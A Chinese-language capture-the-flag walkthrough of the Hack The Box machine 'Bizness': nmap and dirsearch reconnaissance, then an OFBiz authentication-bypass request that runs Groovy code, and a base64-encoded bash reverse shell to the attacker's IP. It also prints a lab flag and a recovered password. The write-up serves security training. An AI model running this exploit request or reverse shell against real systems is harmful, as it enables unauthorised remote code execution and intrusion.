# HTB靶机渗透之bizness（linux-eazy）

## 一、基本信息收集

靶机ip：10.10.11.252

攻击机ip：10.10.16.2

首先用nmap去扫描主机获取主机端口信息

```
sudo nmap -sT -sV -sC -A -O 10.10.11.252
```

扫描结果如下：

```
Starting Nmap 7.80 ( https://nmap.org ) at 2024-03-08 10:23 CST
Nmap scan report for bizness.htb (10.10.11.252)
Host is up (0.43s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
80/tcp  open  http     nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to https://bizness.htb/
443/tcp open  ssl/http nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: BizNess Incorporated
|_http-trane-info: Problem with XML parsing of /evox/about
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK
| Not valid before: 2023-12-14T20:03:40
|_Not valid after:  2328-11-10T20:03:40
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=3/8%OT=22%CT=1%CU=42998%PV=Y%DS=2%DC=T%G=Y%TM=65EA771F
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M537ST11NW7%O2=M537ST11NW7%O3=M537NNT11NW7%O4=M537ST11NW7%O5=M537ST11
OS:NW7%O6=M537ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
OS:R=Y%DF=Y%T=40%W=FAF0%O=M537NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using proto 1/icmp)
HOP RTT       ADDRESS
1   421.65 ms 10.10.16.1
2   421.71 ms bizness.htb (10.10.11.252)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 135.34 seconds
```

可以看到扫描结果中暴露了80,22,443端口，其中域名为bizness.htb，22端口的渗透优先级应该靠后，应当先进行80或443端口的渗透,我们照例使用dirsearch来扫描一下网站目录

```
dirsearch -u https://bizness.htb/
```

扫描结果如下：

```
  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/junbujian/.dirsearch/reports/bizness.htb/-_24-03-08_10-27-22.txt

Error Log: /home/junbujian/.dirsearch/logs/errors-24-03-08_10-27-22.log

Target: https://bizness.htb/

^@[10:27:24] Starting: 
[10:27:58] 404 -  682B  - /META-INF
[10:27:58] 404 -  682B  - /META-INF/
[10:27:58] 404 -  682B  - /META-INF/SOFTWARE.SF
[10:27:58] 404 -  682B  - /META-INF/MANIFEST.MF
[10:27:58] 404 -  682B  - /META-INF/application.xml
[10:27:58] 404 -  682B  - /META-INF/beans.xml
[10:27:58] 404 -  682B  - /META-INF/CERT.SF
[10:27:58] 404 -  682B  - /META-INF/app-config.xml
[10:27:58] 404 -  682B  - /META-INF/context.xml
[10:27:58] 404 -  682B  - /META-INF/application-client.xml
[10:27:58] 404 -  682B  - /META-INF/ejb-jar.xml
[10:27:58] 404 -  682B  - /META-INF/eclipse.inf
[10:27:58] 404 -  682B  - /META-INF/jboss-client.xml
[10:27:58] 404 -  682B  - /META-INF/jboss-ejb-client.xml
[10:27:58] 404 -  682B  - /META-INF/jboss-ejb3.xml
[10:27:58] 404 -  682B  - /META-INF/ironjacamar.xml
[10:27:58] 404 -  682B  - /META-INF/jboss-app.xml
[10:27:58] 404 -  682B  - /META-INF/jboss-deployment-structure.xml
[10:27:58] 404 -  682B  - /META-INF/container.xml
[10:27:58] 404 -  682B  - /META-INF/jbosscmp-jdbc.xml
[10:27:58] 404 -  682B  - /META-INF/openwebbeans/openwebbeans.properties
[10:27:58] 404 -  682B  - /META-INF/spring/application-context.xml
[10:27:58] 404 -  682B  - /META-INF/jboss-webservices.xml
[10:27:58] 404 -  682B  - /META-INF/persistence.xml
[10:27:58] 404 -  682B  - /META-INF/weblogic-ejb-jar.xml
[10:27:58] 404 -  682B  - /META-INF/ra.xml
[10:27:58] 404 -  682B  - /META-INF/weblogic-application.xml
[10:28:01] 404 -  682B  - /WEB-INF
[10:28:01] 404 -  682B  - /WEB-INF/
[10:28:01] 404 -  682B  - /WEB-INF/applicationContext.xml
[10:28:01] 404 -  682B  - /WEB-INF/application-client.xml
[10:28:01] 404 -  682B  - /WEB-INF/beans.xml
[10:28:01] 404 -  682B  - /WEB-INF/application_config.xml
[10:28:01] 404 -  682B  - /WEB-INF/classes/META-INF/persistence.xml
[10:28:01] 404 -  682B  - /WEB-INF/classes/app-config.xml
[10:28:01] 404 -  682B  - /WEB-INF/classes/META-INF/app-config.xml
[10:28:01] 404 -  682B  - /WEB-INF/classes/commons-logging.properties
[10:28:01] 404 -  682B  - /WEB-INF/classes/application.yml
[10:28:01] 404 -  682B  - /WEB-INF/classes/application.properties
[10:28:01] 404 -  682B  - /WEB-INF/classes/cas-theme-default.properties
[10:28:01] 404 -  682B  - /WEB-INF/classes/applicationContext.xml
[10:28:01] 404 -  682B  - /WEB-INF/classes/config.properties
[10:28:01] 404 -  682B  - /WEB-INF/classes/countries.properties
[10:28:01] 404 -  682B  - /WEB-INF/classes/db.properties
[10:28:01] 404 -  682B  - /WEB-INF/classes/default-theme.properties
[10:28:01] 404 -  682B  - /WEB-INF/classes/faces-config.xml
[10:28:01] 404 -  682B  - /WEB-INF/classes/default_views.properties
[10:28:01] 404 -  682B  - /WEB-INF/classes/demo.xml
[10:28:01] 404 -  682B  - /WEB-INF/classes/hibernate.cfg.xml
[10:28:01] 404 -  682B  - /WEB-INF/classes/fckeditor.properties
[10:28:01] 404 -  682B  - /WEB-INF/classes/languages.xml
[10:28:01] 404 -  682B  - /WEB-INF/classes/log4j.xml
[10:28:01] 404 -  682B  - /WEB-INF/classes/log4j.properties
[10:28:01] 404 -  682B  - /WEB-INF/classes/mobile.xml
[10:28:01] 404 -  682B  - /WEB-INF/classes/logback.xml
[10:28:01] 404 -  682B  - /WEB-INF/classes/persistence.xml
[10:28:01] 404 -  682B  - /WEB-INF/classes/protocol_views.properties
[10:28:01] 404 -  682B  - /WEB-INF/classes/services.properties
[10:28:01] 404 -  682B  - /WEB-INF/classes/messages.properties
[10:28:01] 404 -  682B  - /WEB-INF/classes/resources/config.properties
[10:28:01] 404 -  682B  - /WEB-INF/classes/struts.xml
[10:28:01] 404 -  682B  - /WEB-INF/classes/struts.properties
[10:28:01] 404 -  682B  - /WEB-INF/classes/struts-default.vm
[10:28:01] 404 -  682B  - /WEB-INF/classes/velocity.properties
[10:28:01] 404 -  682B  - /WEB-INF/classes/validation.properties
[10:28:01] 404 -  682B  - /WEB-INF/components.xml
[10:28:01] 404 -  682B  - /WEB-INF/classes/theme.properties
[10:28:01] 404 -  682B  - /WEB-INF/classes/web.xml
[10:28:01] 404 -  682B  - /WEB-INF/cas.properties
[10:28:01] 404 -  682B  - /WEB-INF/conf/caches.properties
[10:28:01] 404 -  682B  - /WEB-INF/conf/daemons.properties
[10:28:01] 404 -  682B  - /WEB-INF/conf/config.properties
[10:28:01] 404 -  682B  - /WEB-INF/conf/jtidy.properties
[10:28:01] 404 -  682B  - /WEB-INF/cas-servlet.xml
[10:28:01] 404 -  682B  - /WEB-INF/conf/mime.types
[10:28:01] 404 -  682B  - /WEB-INF/conf/caches.dat
[10:28:01] 404 -  682B  - /WEB-INF/conf/page_navigator.xml
[10:28:01] 404 -  682B  - /WEB-INF/conf/jpa_context.xml
[10:28:01] 404 -  682B  - /WEB-INF/conf/core.xml
[10:28:01] 404 -  682B  - /WEB-INF/conf/db.properties
[10:28:01] 404 -  682B  - /WEB-INF/conf/core_context.xml
[10:28:01] 404 -  682B  - /WEB-INF/conf/editors.properties
[10:28:01] 404 -  682B  - /WEB-INF/conf/lutece.properties
[10:28:01] 404 -  682B  - /WEB-INF/conf/webmaster.properties
[10:28:01] 404 -  682B  - /WEB-INF/conf/search.properties
[10:28:01] 404 -  682B  - /WEB-INF/config/dashboard-statistics.xml
[10:28:01] 404 -  682B  - /WEB-INF/conf/wml.properties
[10:28:01] 404 -  682B  - /WEB-INF/config/faces-config.xml
[10:28:01] 404 -  682B  - /WEB-INF/config/metadata.xml
[10:28:01] 404 -  682B  - /WEB-INF/config/security.xml
[10:28:01] 404 -  682B  - /WEB-INF/config.xml
[10:28:01] 404 -  682B  - /WEB-INF/config/soapConfig.xml
[10:28:01] 404 -  682B  - /WEB-INF/config/users.xml
[10:28:01] 404 -  682B  - /WEB-INF/config/webmvc-config.xml
[10:28:01] 404 -  682B  - /WEB-INF/config/webflow-config.xml
[10:28:01] 404 -  682B  - /WEB-INF/config/mua-endpoints.xml
[10:28:01] 404 -  682B  - /WEB-INF/config/web-core.xml
[10:28:01] 404 -  682B  - /WEB-INF/decorators.xml
[10:28:01] 404 -  682B  - /WEB-INF/deployerConfigContext.xml
[10:28:01] 404 -  682B  - /WEB-INF/ejb-jar.xml
[10:28:01] 404 -  682B  - /WEB-INF/dispatcher-servlet.xml
[10:28:01] 404 -  682B  - /WEB-INF/ias-web.xml
[10:28:01] 404 -  682B  - /WEB-INF/faces-config.xml
[10:28:01] 404 -  682B  - /WEB-INF/glassfish-web.xml
[10:28:01] 404 -  682B  - /WEB-INF/geronimo-web.xml
[10:28:01] 404 -  682B  - /WEB-INF/jboss-web.xml
[10:28:01] 404 -  682B  - /WEB-INF/jboss-ejb3.xml
[10:28:01] 404 -  682B  - /WEB-INF/jax-ws-catalog.xml
[10:28:01] 404 -  682B  - /WEB-INF/glassfish-resources.xml
[10:28:01] 404 -  682B  - /WEB-INF/hibernate.cfg.xml
[10:28:01] 404 -  682B  - /WEB-INF/ibm-web-bnd.xmi
[10:28:01] 404 -  682B  - /WEB-INF/ibm-web-ext.xmi
[10:28:01] 404 -  682B  - /WEB-INF/jboss-client.xml
[10:28:01] 404 -  682B  - /WEB-INF/jonas-web.xml
[10:28:01] 404 -  682B  - /WEB-INF/jboss-deployment-structure.xml
[10:28:01] 404 -  682B  - /WEB-INF/liferay-look-and-feel.xml
[10:28:01] 404 -  682B  - /WEB-INF/liferay-display.xml
[10:28:01] 404 -  682B  - /WEB-INF/jrun-web.xml
[10:28:01] 404 -  682B  - /WEB-INF/jetty-env.xml
[10:28:01] 404 -  682B  - /WEB-INF/jetty-web.xml
[10:28:01] 404 -  682B  - /WEB-INF/liferay-portlet.xml
[10:28:01] 404 -  682B  - /WEB-INF/liferay-layout-templates.xml
[10:28:01] 404 -  682B  - /WEB-INF/liferay-plugin-package.xml
[10:28:02] 404 -  682B  - /WEB-INF/local-jps.properties
[10:28:02] 404 -  682B  - /WEB-INF/logback.xml
[10:28:02] 404 -  682B  - /WEB-INF/local.xml
[10:28:02] 404 -  682B  - /WEB-INF/openx-config.xml
[10:28:02] 404 -  682B  - /WEB-INF/logs/log.log
[10:28:02] 404 -  682B  - /WEB-INF/remoting-servlet.xml
[10:28:02] 404 -  682B  - /WEB-INF/portlet.xml
[10:28:02] 404 -  682B  - /WEB-INF/resin-web.xml
[10:28:02] 404 -  682B  - /WEB-INF/portlet-custom.xml
[10:28:02] 404 -  682B  - /WEB-INF/spring-config/authorization-config.xml
[10:28:02] 404 -  682B  - /WEB-INF/quartz-properties.xml
[10:28:02] 404 -  682B  - /WEB-INF/restlet-servlet.xml
[10:28:02] 404 -  682B  - /WEB-INF/resources/config.properties
[10:28:02] 404 -  682B  - /WEB-INF/rexip-web.xml
[10:28:02] 404 -  682B  - /WEB-INF/spring-config.xml
[10:28:02] 404 -  682B  - /WEB-INF/service.xsd
[10:28:02] 404 -  682B  - /WEB-INF/spring-config/application-context.xml
[10:28:02] 404 -  682B  - /WEB-INF/sitemesh.xml
[10:28:02] 404 -  682B  - /WEB-INF/spring-config/messaging-config.xml
[10:28:02] 404 -  682B  - /WEB-INF/spring-config/management-config.xml
[10:28:02] 404 -  682B  - /WEB-INF/spring-config/presentation-config.xml
[10:28:02] 404 -  682B  - /WEB-INF/spring-config/services-remote-config.xml
[10:28:02] 404 -  682B  - /WEB-INF/spring-configuration/filters.xml
[10:28:02] 404 -  682B  - /WEB-INF/spring-dispatcher-servlet.xml
[10:28:02] 404 -  682B  - /WEB-INF/spring-config/services-config.xml
[10:28:02] 404 -  682B  - /WEB-INF/spring-context.xml
[10:28:02] 404 -  682B  - /WEB-INF/spring-ws-servlet.xml
[10:28:02] 404 -  682B  - /WEB-INF/springweb-servlet.xml
[10:28:02] 404 -  682B  - /WEB-INF/struts-config-widgets.xml
[10:28:02] 404 -  682B  - /WEB-INF/spring-mvc.xml
[10:28:02] 404 -  682B  - /WEB-INF/struts-config.xml
[10:28:02] 404 -  682B  - /WEB-INF/spring/webmvc-config.xml
[10:28:02] 404 -  682B  - /WEB-INF/sun-jaxws.xml
[10:28:02] 404 -  682B  - /WEB-INF/sun-web.xml
[10:28:02] 404 -  682B  - /WEB-INF/tiles-defs.xml
[10:28:02] 404 -  682B  - /WEB-INF/tjc-web.xml
[10:28:02] 404 -  682B  - /WEB-INF/trinidad-config.xml
[10:28:02] 404 -  682B  - /WEB-INF/struts-config-ext.xml
[10:28:02] 404 -  682B  - /WEB-INF/urlrewrite.xml
[10:28:02] 404 -  682B  - /WEB-INF/jboss-ejb-client.xml
[10:28:02] 404 -  682B  - /WEB-INF/validation.xml
[10:28:02] 404 -  682B  - /WEB-INF/validator-rules.xml
[10:28:02] 404 -  682B  - /WEB-INF/web.xml.jsf
[10:28:02] 404 -  682B  - /WEB-INF/web.xml
[10:28:02] 404 -  682B  - /WEB-INF/web-jetty.xml
[10:28:02] 404 -  682B  - /WEB-INF/web-borland.xml
[10:28:02] 404 -  682B  - /WEB-INF/jboss-webservices.xml
[10:28:02] 404 -  682B  - /WEB-INF/web2.xml
[10:28:02] 404 -  682B  - /WEB-INF/weblogic.xml
[10:28:02] 404 -  682B  - /WEB-INF/workflow-properties.xml
[10:28:02] 400 -  795B  - /\..\..\..\..\..\..\..\..\..\etc\passwd
[10:28:05] 400 -  795B  - /a%5c.aspx
[10:28:07] 302 -    0B  - /accounting  ->  https://bizness.htb/accounting/
[10:28:38] 302 -    0B  - /catalog  ->  https://bizness.htb/catalog/
[10:28:40] 404 -  779B  - /common/config/db.ini
[10:28:40] 404 -  762B  - /common/
[10:28:40] 404 -  780B  - /common/config/api.ini
[10:28:41] 302 -    0B  - /common  ->  https://bizness.htb/common/
[10:28:43] 302 -    0B  - /content  ->  https://bizness.htb/content/
[10:28:43] 302 -    0B  - /content/  ->  https://bizness.htb/content/control/main
[10:28:43] 302 -    0B  - /content/debug.log  ->  https://bizness.htb/content/control/main
[10:28:44] 200 -   34KB - /control/
[10:28:44] 200 -   34KB - /control
[10:28:46] 404 -  763B  - /default.html
[10:28:46] 404 -  741B  - /default.jsp
[10:28:49] 302 -    0B  - /error  ->  https://bizness.htb/error/;jsessionid=CDEEA8D480DDD43B43EAE69DE56323A2.jvm1
[10:28:49] 404 -  761B  - /error/
[10:28:50] 302 -    0B  - /example  ->  https://bizness.htb/example/
[10:28:57] 302 -    0B  - /images  ->  https://bizness.htb/images/
[10:28:57] 404 -  762B  - /images/
[10:28:57] 404 -  769B  - /images/Sym.php
[10:28:57] 404 -  769B  - /images/c99.php
[10:28:58] 404 -  768B  - /images/README
[10:28:58] 200 -   27KB - /index.html
[10:28:58] 302 -    0B  - /index.jsp  ->  https://bizness.htb/control/main
[10:29:29] 200 -   21B  - /solr/admin/file/?file=solrconfig.xml
[10:29:29] 200 -   21B  - /solr/admin/

Task Completed

```

扫描结果很多，总结一下暴露了后台地址，也暴露了框架为solr，后台管理系统为ofbiz18.12

![image-20240308104511422](https://s2.loli.net/2024/03/08/1dutglUBX5aJ3WS.png)

由于在主页没有看到任何其他的链接，所以我们暂时梳理一下目前可用的信息

端口：80,443,22

网站语言：Java

网站中间件：ofbiz18.12,solr

网站目录如dirseach目录所示

## 二、确定攻击方向

对于网站渗透肯定优先查看中间件的漏洞

这里先从ofbiz开始，先在因特奈特上搜索一下有没有ofbiz的1day或nday漏洞

![image-20240308105756032](https://s2.loli.net/2024/03/08/tTzky2LQVNqA1nI.png)

喜～～～～～

这里把[参考博客](https://blog.csdn.net/weixin_49125123/article/details/135572932)贴上来

于是查看poc

```
POST /webtools/control/ProgramExport/?USERNAME=&PASSWORD=&requirePasswordChange=Y HTTP/1.1
Host: localhost:8443
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: application/x-www-form-urlencoded
Content-Length: 55

groovyProgram=throw+new+Exception('id'.execute().text);

```

在登陆页面传入post数据包造成命令注入，我们给他修改一下

```
POST /webtools/control/ProgramExport/?USERNAME=&PASSWORD=&requirePasswordChange=Y HTTP/1.1
Host: bizness.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: application/x-www-form-urlencoded
Content-Length: 57

groovyProgram=throw+new+Exception('id'.execute().text);

```

用burp搞一搞～～

![image-20240308110131667](https://s2.loli.net/2024/03/08/MLHZ4JIsEXwjFqC.png)

乐～～～这就找到啦？？？？

开开心心利用咯

果然大佬喂的饭就是香～

## 三、获得立足点

这里直接编写payload来反弹shell，payload如下：

```
"bash+-c+{echo,YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xNi4yLzg4NjYgMD4mMQ==}|{base64,-d}|{bash,-i}".execute();

```

拿到shell：

![image-20240308125450279](https://s2.loli.net/2024/03/08/TwQOYB27F6ak5IM.png)

```
cat ~/user.txt
```

user flag:9b8b10e0d1bd0d6fee0e04a3204f6f6c

四、提权

这里想了很久，琢磨了半天还是没什么思路，于是参考了[这篇文章](https://blog.csdn.net/m0_52742680/article/details/135463244)最终拿到了密码monkeynizness

提权：![image-20240308132130108](https://s2.loli.net/2024/03/08/Vxf4hM9nCYpyAQr.png)

至此完成靶机渗透



